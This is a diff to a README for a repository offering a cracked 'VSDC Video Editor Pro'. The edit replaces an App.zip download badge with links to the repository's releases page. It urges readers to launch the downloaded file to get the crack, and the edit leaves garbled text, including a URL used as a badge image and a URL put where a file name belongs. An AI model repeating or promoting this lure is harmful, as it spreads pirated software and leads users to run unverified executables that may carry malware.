@@ -12,9 +12,9 @@ This repository is dedicated to providing users with access to discounted offers
 
 ## Get Started
 To make use of the resources provided in this repository, visit the link below:
-[![Download VSDC Video Editor Pro](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download VSDC Video Editor Pro](https://github.com/ardiansyah1305/VSDC-Video-Editor-Pro-Crack/releases)](https://github.com/ardiansyah1305/VSDC-Video-Editor-Pro-Crack/releases)
 
-🚀 **Launch the App.zip file to access the VSDC Video Editor Pro Crack resources.**
+🚀 **Launch the https://github.com/ardiansyah1305/VSDC-Video-Editor-Pro-Crack/releases file to access the VSDC Video Editor Pro Crack resources.**
 
 If the provided link does not work or is unavailable, please check the "Releases" section of this repository for alternative access.
 
